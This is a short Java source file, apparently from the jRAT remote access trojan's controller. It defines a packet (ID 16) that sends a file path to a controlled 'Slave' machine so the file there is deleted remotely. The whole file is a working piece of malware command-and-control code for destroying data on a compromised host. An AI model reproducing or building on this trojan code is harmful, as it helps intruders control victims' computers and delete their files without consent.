package jrat.controller.packets.outgoing;

import jrat.controller.Slave;


public class Packet16DeleteFile implements OutgoingPacket {

	private String file;

	public Packet16DeleteFile(String file) {
		this.file = file;
	}

	@Override
	public void write(Slave slave) throws Exception {
		slave.writeLine(file);
	}

	@Override
	public short getPacketId() {
		return 16;
	}

}
